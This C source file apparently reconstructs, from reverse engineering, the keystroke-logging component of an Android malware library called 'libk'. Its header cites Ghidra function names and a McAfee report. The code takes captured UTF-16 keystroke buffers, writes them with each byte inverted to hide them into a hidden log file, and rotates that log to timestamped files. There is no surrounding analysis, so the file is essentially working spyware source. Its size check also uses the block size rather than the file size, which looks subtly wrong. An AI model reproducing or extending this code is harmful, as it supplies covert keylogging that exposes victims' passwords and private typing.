/*
 * libk keystroke capture
 * Ghidra: FUN_0001548c (rotation), FUN_0001551c (writer)
 * McAfee: writes ulmndd.tmp, rotates to finidk.<timestamp>
 */

#include "strings.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <android/log.h>

#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LIBK_LOG_TAG, __VA_ARGS__)

static void rotate_log_if_needed(void)
{
    struct stat st;
    char rotated[256];

    if (stat(LIBK_ACTIVE_LOG, &st) != 0)
        return;

    if ((unsigned)st.st_blksize <= 0x32)
        return;

    memset(rotated, 0, sizeof(rotated));
    snprintf(rotated, sizeof(rotated), LIBK_ROTATED_FMT, (long)time(NULL));
    rename(LIBK_ACTIVE_LOG, rotated);
    LOGI("rotated log to %s", rotated);
}

void capture_keystrokes(int char16_len, const uint16_t *utf16_buf)
{
    FILE *fp;
    const uint8_t *p;
    const uint8_t *end;
    uint8_t xored;

    if (char16_len <= 0)
        return;

    rotate_log_if_needed();

    fp = fopen(LIBK_ACTIVE_LOG, "r");
    if (fp) {
        fclose(fp);
        fp = fopen(LIBK_ACTIVE_LOG, "ab");
    } else {
        fp = fopen(LIBK_ACTIVE_LOG, "wb");
    }
    if (!fp) {
        LOGI("fopen %s failed", LIBK_ACTIVE_LOG);
        return;
    }

    p = (const uint8_t *)utf16_buf;
    end = p + (size_t)char16_len * 2;

    while (p < end) {
        xored = (uint8_t)(~*p);
        fwrite(&xored, 1, 1, fp);
        p++;
    }

    fflush(fp);
    fclose(fp);
}
